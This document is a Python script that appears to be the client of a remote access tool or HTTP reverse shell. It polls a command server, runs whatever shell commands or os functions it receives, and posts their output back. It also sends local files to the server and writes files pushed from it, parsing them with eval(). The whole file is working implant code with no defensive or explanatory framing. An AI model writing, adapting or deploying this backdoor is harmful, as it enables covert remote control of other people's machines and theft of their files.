#!/usr/bin/python3 
import requests
import subprocess
from os import path

class Client():
    def __init__(self,server):
        self.server = server
        
    def os(self,command):
        c=command.split("-")[1]
        attribute=c.split()[0]
        AT = c.split()
        module = __import__("os")
        try:
            function = getattr(module, attribute)
            if len(AT) == 2:
                argument = AT[1]
                try:
                    A = function(argument)
                    R = requests.post(self.server, A)
                except Exception as E:
                    R = requests.post(self.server, (str(E).encode("utf-8")))
            else:
                try:
                    A = function()
                    R = requests.post(self.server, A)
                except Exception as E:
                    R = requests.post(self.server, (str(E).encode("utf-8")))

        except Exception as E:
            R = requests.post(self.server, (str(E).encode("utf-8")))

    def process(self,c):
        if c.startswith("cd"):
            dir=c.split("cd ")[1]
            self.os(f"-chdir {dir}")
        else:
            P = subprocess.Popen(c, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            OUT = P.stdout.read()
            ERR = P.stderr.read()
            if not OUT:
                R = requests.post(self.server, ERR)
            else:
                R = requests.post(self.server, OUT)
    
    def fileReciver(self,command):
        f=command.split("upload ")[1]
        dataDict=eval(f)
        fileName=dataDict['file']
        fileToSave=dataDict['name']
        data=dataDict['data']
        try:
            with open(fileToSave, 'wb') as o:
                o.write( data )
        except Exception as e:
            R = requests.post(self.server,(str(e)).encode('utf-8'))

    def fileSender(self,command):
        fileName=command.split("download ")[1]
        if path.exists(fileName):
            upload=self.server+"/upload"    
            file={'file': open(fileName,"rb"),'name':fileName }
            requests.post(upload,files=file)     
        else:
            R = requests.post(self.server,("File missing").encode('utf-8'))


def main():
    server=None
    obj=Client(server)
    while True:
        try:
            RevcivedData = requests.get(server)
            command = RevcivedData.text
            if command.startswith("download "):
                obj.fileSender(command)
            elif command.startswith("upload "):
                obj.fileReciver(command)
            elif command.startswith("-"):
                obj.os(command)
            else:
                obj.process(command)
        except Exception as e:
            pass

if __name__ == "__main__":
    main()